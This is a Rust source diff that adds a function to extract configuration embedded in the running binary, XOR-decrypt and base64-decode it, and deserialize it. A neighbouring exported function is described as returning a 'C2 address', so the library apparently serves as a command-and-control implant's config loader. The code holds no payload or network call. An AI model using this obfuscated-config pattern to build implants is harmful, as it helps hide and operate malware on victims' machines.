@@ -2,6 +2,34 @@ mod extractor;
 mod models;
 mod transformer;
 
+/// function designed to run through the process of extracting,
+/// transforming and deserializing configuration data from the
+/// current binary.
+///
+/// this is the main logic function of this library.
+pub fn read(key: &[u8]) -> Result<models::core::Configuration, Box<dyn std::error::Error>> {
+    // read configuration bytes from current binary.
+    let cfg_bytes: Vec<u8> = match extractor::core::extract_cfg_bytes() {
+        Ok(result) => result,
+        Err(e) => return Err(e.into()),
+    };
+
+    // XOR decrypt and base64 decode the bytes extracted in the previous
+    // step to get a string representation of the JSON structure holding
+    // the configuration information.
+    let decoded: String = match transformer::core::transform_payload(key, &cfg_bytes) {
+        Ok(result) => String::from_utf8_lossy(&result).to_string(),
+        Err(e) => return Err(e.into()),
+    };
+
+    // JSON deserialize the string acquired from the process above into
+    // a Configuration struct.
+    match transformer::core::deserialize_payload(decoded) {
+        Ok(result) => Ok(result),
+        Err(e) => return Err(e.into()),
+    }
+}
+
 #[no_mangle]
 /// function designed to read the configuration bytes and
 /// return the C2 address. this will read the data from the
